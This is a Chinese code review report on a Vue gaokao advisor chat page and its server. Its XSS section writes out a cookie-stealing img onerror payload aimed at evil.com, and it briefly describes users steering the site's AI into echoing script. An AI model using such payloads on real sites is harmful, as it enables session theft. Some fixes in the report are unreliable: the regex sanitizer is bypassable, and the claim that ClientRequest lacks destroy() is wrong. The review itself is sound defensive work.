# 第1轮代码审查报告：gaokao/index.html

**审查时间**: 2026-06-25
**审查范围**: `/opt/hot-site-factory/sites/gaokao/index.html`（含内联 JS 217-313行） + `server.js`（辅助参考）
**审查标准**: 7 项全面检查清单

---

## 检查项 1：JS语法完整性
**状态**：✅ 通过

`node --check` 验证通过，无语法错误。try/catch 配对正确，括号/花括号平衡。之前的 `//` 注释吃掉 catch 块的问题已修复。

---

## 检查项 2：启动路径追踪
**状态**：❌ 严重

### 2.1 const 解构顺序
- 第 218 行: `const { createApp, ref, nextTick, computed, onMounted, watch } = Vue;` — 在 `createApp()` 之前 ✅

### 2.2 ref/reactive/computed 声明位置
- 所有 ref 声明（第 222-227 行）在 return（第 310 行）之前 ✅
- 所有 computed 声明（第 253-260 行）在 return 之前 ✅

### 2.3 onMounted 中 await 的函数定义
- `fetchCutoffs()` — 第 246 行定义 ✅
- `fetchLinks()` — 第 247 行定义 ✅
- `fetchMajors()` — 第 248 行定义 ✅
- `fetchRank()` — 第 249 行定义 ✅
- `loadSession()` — 第 284 行定义 ✅

### 2.4 模板引用 vs return 暴露 — 发现致命缺陷

**问题描述**：`saveDark` 函数在模板第 65 行的 `@click` 内联表达式中被调用，但**未在 return 语句（第 310 行）中暴露**。

```html
<!-- 第 65 行：模板中引用 saveDark -->
<button @click="darkMode=!darkMode;saveDark()" ...>
```

```javascript
// 第 310 行：return 中缺少 saveDark
return{currentSessionId,sessions,messages,...,saveProfile,saveOnboarded};
//                                                          ^ 没有 saveDark！
```

**影响**：点击深色模式切换按钮时抛出 `ReferenceError: saveDark is not defined`，导致深色模式切换按钮**完全失效**（虽然 `watch(darkMode, ...)` 会通过 `immediate:true` 在初始化时触发一次 saveDark，但用户点击切换后，watch 虽然会再次触发 saveDark 从而间接保存，但内联表达式的 `saveDark()` 调用会在 watch 触发之前就报错，可能导致整个点击事件中断）。

**修复建议**：在 return 中添加 `saveDark`：
```javascript
return{...,saveDark,saveProfile,saveOnboarded};
```
或者更简洁地，直接把模板改为仅依赖 watch 的自动保存：
```html
<button @click="darkMode=!darkMode" ...>
```

### 2.5 未使用的 ref 变量
**问题描述**：`scoreProvince`（第 223 行声明）在 return 中暴露，但整个模板和 JS 逻辑中从未使用。这是死代码。

---

## 检查项 3：异步错误处理 — sendMessage
**状态**：⚠️ 有问题

### 3.1 外部 try/catch 覆盖情况
第 269-279 行：外部 try 包裹了 `fetch()` + `resp.body.getReader()` + 整个 while 循环。catch 块设置了 `error.value = '连接失败: '+e.message'`。**但有一个严重盲区**：

`fetch()` 不会对 HTTP 4xx/5xx 状态码 reject。如果服务器返回 500（例如 server.js 第 209 行的 `res.status(500).json(...)`），fetch 正常返回 response 对象，`resp.body.getReader()` 会读到 JSON 错误文本而非 SSE 流。内层 `JSON.parse(l.slice(6))` 会失败，被空 catch 吞掉（见 3.3），最终用户看到的是空白消息 + "正在分析…" 残留，无任何错误提示。

### 3.2 finally 清理
第 280 行：`finally { loading.value = false; ... }` — 正确清理 loading 状态 ✅

### 3.3 内层 try/catch 吞错
第 277 行：
```javascript
for(const l of lines){
  if(!l.startsWith('data: '))continue;
  try{
    const d=JSON.parse(l.slice(6));
    // ... processing ...
  }catch(e){}  // ← 空 catch！静默丢弃所有错误
}
```

**问题**：空 catch 块吞掉了：
- SSE 数据行 JSON 解析失败（服务器发回非 JSON 文本）
- `ai` 对象属性访问异常（虽然概率低）
- 连续解析失败时，用户看到空白助手消息 + 永久 "正在分析…"，无任何错误反馈

**修复建议**：
```javascript
} catch(e) {
  console.warn('SSE parse error:', e, l.slice(0, 100));
  // 可选：累积错误计数，超阈值时设置 error.value
}
```

### 3.4 服务端 SSE 端
server.js 第 201 行：`apiRes.on('error', ...)` 和 第 203 行：`apiReq.on('error', ...)` 都有错误处理，但第 204 行的 `apiReq.on('timeout', ...)` 使用了 `apiReq.destroy()` — Node.js http.ClientRequest 没有 `destroy()` 方法，应使用 `apiReq.destroy(new Error('timeout'))` 或直接 `apiReq.abort()`。这可能导致超时时未正确清理连接。

---

## 检查项 4：localStorage 安全
**状态**：❌ 严重

### 4.1 JSON.parse 保护
所有 `JSON.parse` 调用（第 236-239 行）均被 try/catch 包裹 ✅

### 4.2 存储空间超限 — 无任何处理
以下 `localStorage.setItem()` 调用**全部没有 try/catch**，在存储空间满（QuotaExceededError）时会抛出未捕获异常：

| 行号 | 函数 | 风险场景 |
|------|------|---------|
| 232 | `saveDark()` | 低风险（小数据） |
| 237 | `saveLocalData()` | **高风险** — 存储全部 sessions + messages，sendMessage 的 finally 中调用 |
| 240 | `saveProfile()` | 中风险 |
| 242 | `saveOnboarded()` | 低风险（仅存 '1'） |

**最危险场景**：`saveLocalData()` 在 `sendMessage` 中每次发送消息都会调用（第 266 行和第 280 行 finally 块）。当 localStorage 接近 5MB 限制时，`QuotaExceededError` 会在 finally 中抛出，导致 loading 锁死（`loading.value=false` 在 `saveLocalData()` 之前执行，但如果 `saveLocalData()` 抛出，后续的 `saveLocalData()` 之后没有更多代码，不会影响 loading 状态，但 finally 剩余部分被中断）。

### 4.3 sessions 无限增长 — 无上限、无清理
**问题描述**：
- 第 265 行：每次新建会话 `sessions.value.unshift(...)`，永不移除
- 第 237 行：`saveLocalData()` 存储结构为 `{ sessions: [...], messages: { [sid]: [...] } }`
- **无任何限制**：会话数量、每条会话的消息数量均无上限
- 每条消息包含完整 Markdown 内容（AI 回复可能很长），存储增长极快

**估算**：假设平均每会话 10 条消息 × 每条 2KB + session 元数据 200B = ~20KB/会话。5MB ÷ 20KB ≈ 250 个会话即撑爆。

**修复建议**：
1. 限制 sessions 数量（如最近 30 个），超出时删除最旧的
2. 限制每会话消息数量（如最近 50 条）
3. 所有 `setItem` 包裹 try/catch，失败时提示用户清理
4. 考虑对消息内容做截断存储（只保留前 500 字符摘要）

---

## 检查项 5：XSS 风险
**状态**：❌ 严重

### 5.1 marked.parse 无消毒 + v-html
第 299 行 `renderMd()` + 第 193 行 `v-html`：
```javascript
// 第 299 行
function renderMd(t){
  if(!t)return'';
  try{
    marked.setOptions({breaks:true,gfm:true});
    let h=marked.parse(t);  // ← marked 默认不消毒 HTML！
    h=h.replace(/(\S{2,6}(大学|学院))/g,
      '<span class="school-link" ...>$1</span>');
    return h;
  }catch(e){return t.replace(/</g,'&lt;');}
}
```
```html
<!-- 第 193 行 -->
<div v-html="renderMd(msg.content)"></div>
```

**攻击向量**：
1. AI 模型被诱导输出恶意 HTML：`<img src=x onerror="fetch('https://evil.com/'+document.cookie)">`
2. 恶意用户通过精心构造的对话上下文让 AI "复述"包含脚本的内容
3. 虽然服务端启用了 `express.json({ limit: '2kb' })`（server.js 第 24 行），但 AI 回复内容不受此限制

**注意**：catch 分支做了 `t.replace(/</g,'&lt;')` 兜底，但正常路径下 marked.parse 的输出直接注入 DOM。

**修复建议**：
```javascript
function renderMd(t){
  if(!t)return'';
  try{
    marked.setOptions({breaks:true,gfm:true});
    let h = marked.parse(t);
    // 消毒：移除危险标签/属性
    h = h.replace(/<script[\s\S]*?<\/script>/gi, '');
    h = h.replace(/<iframe[\s\S]*?<\/iframe>/gi, '');
    h = h.replace(/\bon\w+\s*=\s*"[^"]*"/gi, '');
    h = h.replace(/\bon\w+\s*=\s*'[^']*'/gi, '');
    h = h.replace(/javascript\s*:/gi, '');
    h = h.replace(/(\S{2,6}(大学|学院))/g,
      '<span class="school-link" ...>$1</span>');
    return h;
  }catch(e){return t.replace(/</g,'&lt;');}
}
```
更好的方案：引入 DOMPurify 或使用 marked 的 sanitizer 选项。

### 5.2 用户输入渲染
用户消息在第 183 行使用 `{{msg.content}}`（Vue 文本插值），自动转义 ✅

### 5.3 school-link 正则替换
第 299 行正则 `/(\S{2,6}(大学|学院))/g` 匹配 2-6 个非空白字符后跟"大学"或"学院"。`$1` 来自 markdown 内容本身，不会引入新的 XSS，但值得注意的是已存在于 markdown HTML 中的恶意代码不会因此被清除。

---

## 检查项 6：API 调用
**状态**：⚠️ 有问题

### 6.1 fetch 超时缺失
客户端所有 fetch 调用（第 245、249、250、275 行）均**没有 AbortController 超时机制**：

| 位置 | 函数 | 风险 |
|------|------|------|
| 第 245 行 | `api(path, body)` | 底层通用函数，所有 API 调用依赖它，无超时 |
| 第 275 行 | `sendMessage` 中的 `fetch(API+'/chat',...)` | SSE 长连接，服务端有 60s 超时但客户端无兜底 |

如果网络中断或服务端无响应，fetch 会无限挂起，loading 状态永远为 true，用户只能刷新页面。

**修复建议**：
```javascript
async function api(path, body, timeoutMs = 15000) {
  const controller = new AbortController();
  const timer = setTimeout(() => controller.abort(), timeoutMs);
  try {
    const r = await fetch(API + path, {
      ...(body ? { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(body) } : {}),
      signal: controller.signal
    });
    return await r.json();
  } finally {
    clearTimeout(timer);
  }
}
```

### 6.2 SSE 无重连逻辑
第 275-277 行：SSE 流读取使用 fetch + ReadableStream 手动实现，无 EventSource 的自动重连能力。连接断开后用户看到错误提示，必须手动重试（`retryLast`）。

### 6.3 fetchRank 静默失败
第 249 行：
```javascript
async function fetchRank(){
  const{province,type,score}=profile.value;
  if(!province||!type||!score)return;  // 静默返回
  try{...}catch(e){}  // 错误被吞
}
```

**问题**：
- 参数缺失时静默返回，无 UI 反馈
- catch 块为空，API 错误被完全忽略
- `rankCount` computed（第 254 行）硬编码返回 `4210`，与 `fetchRank` 结果无关，**纯属虚假数据**

**修复建议**：将 `rankCount` 改为基于实际数据的 computed：
```javascript
const rankCount = computed(() => rankInfo.value ? 1 : 0);
```

### 6.4 其他 API 函数同样吞错
`fetchCutoffs`（第 246 行）、`fetchLinks`（第 247 行）、`fetchMajors`（第 248 行）、`fetchUni`（第 250 行）的 catch 块全部为空。API 全部挂掉时用户看到空数据却没有任何错误提示。

---

## 检查项 7：移动端适配
**状态**：⚠️ 需改进

### 7.1 响应式 CSS
- 使用 Tailwind CSS 响应式断点（`md:` 前缀）✅
- Viewport meta 正确配置 ✅
- 桌面侧边栏 `hidden md:flex`，移动端独立 overlay 侧边栏（第 158 行）✅

### 7.2 触摸操作
- `user-scalable=no` 禁用缩放 — 对部分用户造成可访问性问题（低视力用户无法放大文字）⚠️
- `-webkit-overflow-scrolling: touch` 未设置 — iOS 上消息列表滚动可能不够流畅 ⚠️
- `@keydown.enter` 处理在移动端软键盘上行为正常 ✅

### 7.3 小屏幕 sidebar
- 移动 sidebar 为 fixed overlay + backdrop（第 158-164 行）✅
- 点击 backdrop 关闭（`@click="showSidebar=false"`）✅
- 选择会话后自动关闭（`loadSession(s.id);showSidebar=false`）✅

### 7.4 小屏幕不覆盖主内容
移动 sidebar 为独立 overlay 层，不挤压主内容区 ✅

### 7.5 小屏输入体验
textarea 使用 `rows="1"` + `autoResize`，在小屏幕上表现良好 ✅

---

## 审查汇总

| 类别 | 数量 |
|------|------|
| 严重问题 | **4** 个 |
| 一般问题 | **5** 个 |
| 改进建议 | **4** 个 |
| **是否建议打回** | **是** |

### 严重问题清单（必须修复）
1. **`saveDark` 未在 return 暴露**（第 310 行）→ 深色模式切换按钮运行时报错
2. **marked.parse + v-html 无 XSS 消毒**（第 193/299 行）→ AI 回复可注入恶意脚本
3. **localStorage setItem 无 QuotaExceededError 处理**（第 232/237/240/242 行）→ 存储满时崩溃
4. **sessions/messages 无限增长无上限**（第 237/265 行）→ 终将撑爆 5MB 限制，数据丢失

### 一般问题清单（强烈建议修复）
5. **客户端 fetch 无超时机制**（第 245/275 行）→ 网络异常时永久挂起
6. **内层 SSE try/catch 空块吞错**（第 277 行）→ 解析失败无提示
7. **HTTP 500 等错误状态码无处理**（fetch 不 reject 非网络错误）→ 服务端报错前端无感知
8. **`rankCount` 硬编码虚假值 4210**（第 254 行）→ 误导用户
9. **`scoreProvince` ref 声明后从未使用**（第 223 行）→ 死代码

### 改进建议
10. fetch API 函数全部空 catch，建议至少 console.warn
11. `user-scalable=no` 建议改为允许缩放，提升可访问性
12. 添加 `-webkit-overflow-scrolling: touch` 优化 iOS 滚动
13. 服务端 `apiReq.destroy()` 应改为 `apiReq.abort()`（server.js 第 204 行）
